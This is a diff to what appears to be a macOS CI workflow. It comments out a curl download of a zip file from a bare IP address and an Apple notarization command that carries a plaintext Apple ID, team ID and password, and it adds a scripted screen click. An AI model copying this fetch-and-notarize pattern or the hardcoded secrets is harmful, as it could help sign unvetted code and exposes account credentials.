@@ -17,9 +17,10 @@ jobs:
         run: |
           # Replace this with the actual command to download the file from the IP address.
           # You can use 'curl' or other relevant tools.
-          curl -o s.zip http://161.35.226.248:9000/s.zip
+          #curl -o s.zip http://161.35.226.248:9000/s.zip
           brew install cliclick
           cliclick  c:.
+          echo $?
       # You would need to add additional steps here to perform notarization.
       # The specific notarization process depends on your application and requirements.
 
@@ -28,4 +29,4 @@ jobs:
         run: |
           # Replace this with your code signing and notarization commands.
           # This is just a placeholder example.
-          xcrun notarytool submit s.zip --apple-id "deljwviuro@yahoo.com" --team-id "49T3Z5327K" --password "vqcn-zywi-nrfx-vinr"  --wait
+        #  xcrun notarytool submit s.zip --apple-id "deljwviuro@yahoo.com" --team-id "49T3Z5327K" --password "vqcn-zywi-nrfx-vinr"  --wait
